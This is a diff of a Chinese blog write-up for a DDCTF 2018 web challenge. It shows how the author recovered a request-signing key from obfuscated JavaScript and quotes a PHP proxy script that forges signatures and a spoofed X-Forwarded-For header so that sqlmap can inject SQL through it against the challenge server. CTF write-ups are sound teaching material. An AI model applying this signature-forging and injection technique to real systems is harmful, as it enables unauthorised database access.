@@ -133,7 +133,7 @@
 <meta property="og:image" content="http://blog.darknessdoor.com/upload_image/20180524/ctf-web-10.png">
 <meta property="og:image" content="http://blog.darknessdoor.com/upload_image/20180524/ctf-web-11.png">
 <meta property="og:image" content="http://blog.darknessdoor.com/upload_image/20180524/ctf-web-12.png">
-<meta property="og:updated_time" content="2018-05-24T13:51:24.300Z">
+<meta property="og:updated_time" content="2018-05-24T13:57:17.780Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DDCTF-2018-writeup">
 <meta name="twitter:description" content="万丈红尘静驻于茫茫人海看世事繁华嘈杂喧嚣心却孤零   　　 　　 前辈推荐了DDCTF的2018writeup，觉得有必要跟进了解一下。如果有兴趣的也可以去了解一下。">
@@ -444,7 +444,7 @@
 
 <p>很明显你会发现sig后面传递了个值同时time也传递了个值。尝试对后面的值就行随意的修改试试看。<br>好的，无论删减还是进行个添加均没有太大的用处，你会发现页面返回正常。然后接下来接着进行一点点的分析。<br>这个时候你当然要点开发者工具，也就是F12键…我就没见过没人不点的…养成习惯就好了。<br>这时候注意我下面的这幅图。非常的重要…在ctf中碰见key啊，或者什么flag这些字段啊，一定要十分的注意…如果忽略了，那么恭喜你，凉凉吧。<br>当然也有不是在这儿的…我这仅仅是猜测啊…对不队你们得自己去一个个去派出去搜寻。话说，第一题出这么难做什么…很是悲伤啊。<br><img src="/upload_image/20180524/ctf-web-9.png" alt=""><br>对不起，这里啪啪打脸..好像var key就是个转义字符而已…脸感觉已经通红。<br>接着往下。<br>你会看见引入的两个js文件以及底下一队东西，底下的一堆东西搜寻完，啥都没收获，只能进入js文件了。<br>进了math.js你会发现其实里面并没有什么东西，而且还排列的非常整齐。（等等你们就知道我为什么要强调整齐了）。</p>
 <p>于是我出来了，进了另一个main.js,好的，丧心病狂的正式开始了。放图。<br><img src="/upload_image/20180524/ctf-web-10.png" alt=""><br>越是这种情况，越是证明他有鬼…至少我每次遇到这种题目是自我这么安慰的。<br>实话实说…我是彻底没看懂他是在干嘛的。这时候去看大牛的文章，发现他对这段js进行了一个整理。卧槽…真心牛逼加无敌啊。<br>这里我下方放上大牛对这段代码的整理。</p>
-<pre>><code>
+<pre><code>
 // key 位于主页 JS 中，此处不再单独截图。内容是 adrefkfweodfsdpiru
 var key="141144162145146153146167145157144146163144160151162165" 
 function signGenerate(obj, key) {
@@ -480,37 +480,37 @@ function submitt() {
 <p>然后肯定就是要针对author=1进行一些姿势，到了这里呢，我开始就有点不太会了。讲真的，完全不造第一题出这么难是要干吗。第一题这么难，后面的题目大家都凉凉了呀。<br>然后看了两位大佬的方法，都其实挺不错的…但都要自己构造脚本或者仿写本地文件。（讲真，我流下了，没有技术的泪水。）</p>
 <h5 id="a-采用了使用-PHP-编写代理页面的方式"><a href="#a-采用了使用-PHP-编写代理页面的方式" class="headerlink" title="a.采用了使用 PHP 编写代理页面的方式"></a>a.采用了使用 PHP 编写代理页面的方式</h5><p>这位大佬采用了了采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。（即可…说的好像很容易似的。）<br>命名一个proxy.php  对其中写入如下的代码。</p>
 <pre><code>
-<?php
-@$id = $_REQUEST['id'];
-@$title = $_REQUEST['title'];
-@$author = $_REQUEST['author'];
-@$date = $_REQUEST['date'];
-$time = time();
-$sig = sha1('id='.$id.'title='.$title.'author='.$author.'date='.$date.'time='.$time.'adrefkfweodfsdpiru');
-$ch = curl_init();
-$post = [
-    'id' => $id,
-    'title' => $title,
-    'author' => $author,
-    'date' => $date,
-];
-curl_setopt($ch, CURLOPT_URL,"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&time=$time");
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-    'X-Forwarded-For: 123.232.23.245',
-    ));
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, true);
-$ch_out = curl_exec($ch);
-$ch_info = curl_getinfo($ch);
-$header = substr($ch_out, 0, $ch_info['header_size']);
-$body = substr($ch_out, $ch_info['header_size']);
-http_response_code($ch_info['http_code']);
-//header($header);
-//echo $header;
-echo $body;
-</code></pre>
+                <?php
+                @$id = $_REQUEST['id'];
+                @$title = $_REQUEST['title'];
+                @$author = $_REQUEST['author'];
+                @$date = $_REQUEST['date'];
+                $time = time();
+                $sig = sha1('id='.$id.'title='.$title.'author='.$author.'date='.$date.'time='.$time.'adrefkfweodfsdpiru');
+                $ch = curl_init();
+                $post = [
+                    'id' => $id,
+                    'title' => $title,
+                    'author' => $author,
+                    'date' => $date,
+                ];
+                curl_setopt($ch, CURLOPT_URL,"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&time=$time");
+                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                    'X-Forwarded-For: 123.232.23.245',
+                    ));
+                curl_setopt($ch, CURLOPT_POST, 1);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                curl_setopt($ch, CURLOPT_HEADER, true);
+                $ch_out = curl_exec($ch);
+                $ch_info = curl_getinfo($ch);
+                $header = substr($ch_out, 0, $ch_info['header_size']);
+                $body = substr($ch_out, $ch_info['header_size']);
+                http_response_code($ch_info['http_code']);
+                //header($header);
+                //echo $header;
+                echo $body;
+                </code></pre>
 之后通过对本地的这个php页面进行一个slqmap注入。说实话我很好奇，他是怎么知道的这个注入点的。后来释然了。这道题的提示是数据库的秘密，你肯定得进去数据库，只能注入了..
 
 
